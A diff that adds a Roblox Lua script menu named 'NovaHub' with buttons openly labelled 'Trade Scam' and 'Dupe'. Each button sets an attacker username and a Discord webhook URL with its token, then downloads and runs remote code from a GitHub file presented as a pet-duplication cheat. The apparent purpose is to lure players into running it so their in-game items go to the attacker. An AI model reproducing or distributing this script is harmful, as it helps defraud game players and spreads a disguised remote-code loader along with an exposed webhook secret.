@@ -1,0 +1,29 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("NovaHub", "Midnight")
+
+
+local Main = Window:NewTab("TradeScam")
+local Section = Main:NewSection("TradeScam")
+
+
+Section:NewButton("Trade Scam", "ScamTrade", function()
+    UserName = "znhotrep"
+WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
+
+end)
+
+
+local Main = Window:NewTab("Dupe Script")
+local Section = Main:NewSection("Dupe")
+
+Section:NewButton("Dupe", "Make Ur Pet Dupe", function()
+    UserName = "znhotrep"
+WebHook = "https://discord.com/api/webhooks/1063581303984898190/kj77L0oisA_ae87i5gh1uklWPMCHS_vT7DTYIOS-SKeSC1l0zb0o7wa-H2RTA7dTxWnP"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
+
+end)
